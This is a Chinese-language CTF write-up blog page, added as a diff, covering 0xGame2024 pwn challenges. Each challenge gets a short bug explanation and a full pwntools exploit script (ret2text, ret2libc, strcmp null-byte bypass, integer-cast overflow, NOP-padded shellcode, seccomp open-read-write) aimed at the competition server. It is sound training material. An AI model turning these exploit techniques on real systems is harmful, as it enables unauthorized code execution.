@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>haoo&#39;s tech blog - 0xGame2024-复现</title>
+<meta name="description" content="where_is_my_binsh 一道简单的题目，存在栈溢出以及system函数，没有&amp;#x2F;bin&amp;#x2F;sh\x00字符串，给了变量something的地址，那么就先输入&amp;#x2F;bin&amp;#x2F;sh\x00字符串再打ret2text。 from pwn import*io=remote(&amp;#x27;">
+<meta name="theme-color" content="#090c0b">
+<meta name="color-scheme" content="dark">
+<script>
+  (function () {
+    try {
+      var palette = localStorage.getItem('startrace-palette');
+      if (['green', 'cyan', 'amber'].includes(palette)) document.documentElement.dataset.palette = palette;
+    } catch (error) {}
+  })();
+</script>
+<link rel="stylesheet" href="/css/main.css">
+
+  <link rel="alternate" type="application/rss+xml" title="haoo&#39;s tech blog RSS" href="/rss.xml">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body class="site-body">
+  
+  <header class="site-header">
+  <a class="skip-link" href="#main-content">跳到正文</a>
+  <div class="site-header__inner">
+    <a class="site-brand" href="/" aria-label="haoo&#39;s tech blog 首页">
+      <span class="site-brand__mark" aria-hidden="true">0x</span>
+      <span class="site-brand__text">
+        <strong>haoo&#39;s tech blog</strong>
+      </span>
+    </a>
+
+    <nav id="site-nav" class="site-nav" aria-label="主导航">
+      
+      
+        <a class="site-nav__link" href="/">首页</a>
+      
+        <a class="site-nav__link" href="/categories">知识库</a>
+      
+        <a class="site-nav__link" href="/tags">标签</a>
+      
+        <a class="site-nav__link" href="/about">关于</a>
+      
+        <a class="site-nav__link" href="/links">链接</a>
+      
+        <a class="site-nav__link" href="/rss.xml">RSS</a>
+      
+    </nav>
+
+    <button class="command-toggle" type="button" data-command-open aria-label="打开命令行" aria-keyshortcuts="Control+K">
+      <span aria-hidden="true">&gt;_</span>
+      <span>Console</span>
+      <kbd>Ctrl K</kbd>
+    </button>
+
+    <button class="palette-toggle" type="button" data-palette-toggle aria-label="切换主题配色" title="切换主题配色">
+      <span class="palette-toggle__swatch" aria-hidden="true"></span>
+      <span data-palette-label>绿色</span>
+    </button>
+
+    <button class="menu-toggle" type="button" aria-label="打开导航" aria-expanded="false" aria-controls="site-nav">
+      <span></span>
+      <span></span>
+      <span></span>
+    </button>
+  </div>
+  <div class="reading-progress" aria-hidden="true"><span></span></div>
+</header>
+
+
+  <main id="main-content" class="site-main article-main">
+    <article class="article-wrap">
+      <header class="article-header">
+        <div class="post-meta">
+          <span>2894 字</span>
+        </div>
+        <h1>0xGame2024-复现</h1>
+        
+          <div class="tag-list">
+            
+              <a class="tag-chip tag-chip--solid" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+            
+            
+              <a class="tag-chip" href="/tags/ctf/">ctf</a>
+            
+          </div>
+        
+      </header>
+
+      <div class="article-grid">
+        <div class="article-body article-prose" id="article-content">
+          <h1 id="where-is-my-binsh"><a href="#where-is-my-binsh" class="headerlink" title="where_is_my_binsh"></a>where_is_my_binsh</h1><p><img src="/images/0xGame2024-where_is_my_binsh_1.png"></p>
+<p><img src="/images/0xGame2024-where_is_my_binsh_2.png"></p>
+<p>一道简单的题目，存在栈溢出以及system函数，没有&#x2F;bin&#x2F;sh\x00字符串，给了变量something的地址，那么就先输入&#x2F;bin&#x2F;sh\x00字符串再打ret2text。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io=remote(<span class="hljs-string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="hljs-number">20884</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./where_is_my_binsh&#x27;</span>)<br>bin_sh=<span class="hljs-number">0x0404090</span><br>system=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>ret=<span class="hljs-number">0x040101a</span><br>rdi=<span class="hljs-number">0x0401323</span><br><br>io.sendlineafter(<span class="hljs-string">&#x27;If you want it ,then you have to create it:&#x27;</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>payload=cyclic(<span class="hljs-number">0x10</span>+<span class="hljs-number">8</span>)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)+p64(<span class="hljs-number">0x40123F</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;Do you find what you want now ?&#x27;</span>,payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h1><p><img src="/images/0xGame2024-boom.png"></p>
+<p>该题先输入一段字符串，再将输入的字符串与程序随机生成的字符串进行比较，若一样则获得shell，否则退出程序。此题的关键在于strcmp函数，其存在\x00截断的问题，在生成secret时会有概率生成一个以\x00开头的字符串，从而绕过检测。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    io=remote(<span class="hljs-string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="hljs-number">20917</span>)<br>    io.sendafter(<span class="hljs-string">&#x27;her thinking?&#x27;</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span>)<br>    io.recvline()<br>    res=io.recvline()<br>    <br>    <span class="hljs-built_in">print</span>(res)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;WOW&#x27;</span> <span class="hljs-keyword">in</span> res:<br>        <span class="hljs-keyword">break</span><br>    io.close()<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="positive"><a href="#positive" class="headerlink" title="positive"></a>positive</h1><p><img src="/images/0xGame2024-positive_1.png"></p>
+<p>本题对有符号与无符号的整数类型进行了考察，首先if的判断是int类型，而最后输入的大小又转换成了unsigned int类型，因此可以先输入一个负数绕过if判断，然后经过类型转换，该负数就会变为一个很大的正整数，从而造成栈溢出。</p>
+<p><img src="/images/0xGame2024-positive_2.png"></p>
+<p>存在后门函数，直接打即可。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io=remote(<span class="hljs-string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="hljs-number">20965</span>)<br>bin_sh=<span class="hljs-number">0x40126A</span><br>ret=<span class="hljs-number">0x40101a</span><br>io.sendlineafter(<span class="hljs-string">&#x27;How many steps do you wang her to walk:&#x27;</span>,<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>payload=cyclic(<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>)+p64(ret)+p64(bin_sh)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>简单的64位ret2libc。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf=ELF(<span class="hljs-string">&#x27;./ret2libc&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./ret2libc.so.6&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="hljs-number">20982</span>)<br><br>rdi=<span class="hljs-number">0x04012c3</span><br>ret=<span class="hljs-number">0x040101a</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload=cyclic(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>io.sendline(payload)<br><br>puts=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts))<br><br>libc_base=puts-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh=libc_base+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br><br>payload=cyclic(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack-overflow"></a>stack-overflow</h1><p>简单的64位ret2text</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io=remote(<span class="hljs-string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="hljs-number">20013</span>)<br>payload=cyclic(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x040101a</span>)+p64(<span class="hljs-number">0x4012BD</span>)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="shellcode-lv0"><a href="#shellcode-lv0" class="headerlink" title="shellcode-lv0"></a>shellcode-lv0</h1><p><img src="/images/0xGame2024-shellcode_lv0.png"></p>
+<p>正如题目名，直接打shellcode，但是本题会随机将buf的前几段丢弃，因此我们可以在shellcode前加上许多nop，最后也能运行完整的shellcode。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>io=remote(<span class="hljs-string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="hljs-number">20014</span>)<br><br>shellcode=asm(shellcraft.sh())<br>payload=shellcode.rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="shellcode-lv1"><a href="#shellcode-lv1" class="headerlink" title="shellcode-lv1"></a>shellcode-lv1</h1><p><img src="/images/0xGame2024-shellcode_lv1_1.png"></p>
+<p>本题与lv0差不多，但是本题开启了沙盒保护。</p>
+<p><img src="/images/0xGame2024-shellcode_lv1_2.png"></p>
+<p>禁用了execve以及execveat，但是可以通过打orw获得flag。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>io=remote(<span class="hljs-string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="hljs-number">20015</span>)<br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)+shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-number">0x20240000</span>,<span class="hljs-number">100</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-number">0x20240000</span>,<span class="hljs-number">100</span>)<br>shellcode=asm(shellcode)<br><br>payload=shellcode.rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x91&#x27;</span>)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+          <aside class="toc-panel" aria-label="文章目录">
+            <div class="toc-panel__head">
+              <h2>目录</h2>
+              <button class="toc-top" type="button">顶部</button>
+            </div>
+            <nav id="toc"></nav>
+          </aside>
+        
+      </div>
+
+      <nav class="article-nav" aria-label="文章导航">
+        
+          <a href="/XYNU2024%E4%BF%A1%E5%AE%89%E6%9D%AF/">
+            <span>上一篇</span>
+            <strong>XYNU2024信安杯</strong>
+          </a>
+        
+        
+          <a href="/SQCTF_2025/">
+            <span>下一篇</span>
+            <strong>2025SQCTF</strong>
+          </a>
+        
+      </nav>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>31 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
+    <p>&copy; haoo · powered by Hexo</p>
+  </div>
+</footer>
+<dialog
+  id="command-console"
+  class="command-console"
+  aria-labelledby="command-title"
+  data-search-url="/search.json"
+  data-home-url="/"
+  data-categories-url="/categories"
+  data-tags-url="/tags"
+  data-about-url="/about"
+  data-links-url="/links"
+>
+  <div class="command-console__bar">
+    <div>
+      <span class="command-console__status" aria-hidden="true"></span>
+      <strong id="command-title">haoo@blog:~</strong>
+    </div>
+    <button class="command-console__close" type="button" data-command-close aria-label="关闭命令行">ESC</button>
+  </div>
+
+  <div id="command-output" class="command-console__output" role="log" aria-live="polite" aria-relevant="additions">
+    <div class="command-message command-message--accent">Startrace interactive shell v1.0</div>
+    <div class="command-message">输入 <code>help</code> 查看命令，按 <kbd>Ctrl K</kbd> 随时打开。</div>
+  </div>
+
+  <form id="command-form" class="command-console__form" autocomplete="off">
+    <label for="command-input"><span aria-hidden="true">visitor@blog:~$</span><span class="visually-hidden">输入命令</span></label>
+    <input id="command-input" name="command" type="text" inputmode="text" autocapitalize="off" spellcheck="false" aria-describedby="command-hint">
+    <span class="command-console__cursor" aria-hidden="true"></span>
+  </form>
+  <p id="command-hint" class="command-console__hint">help · ls · cd · open · search · clear</p>
+</dialog>
+
+<script src="/js/theme.js" defer></script>
+
+</body>
+</html>
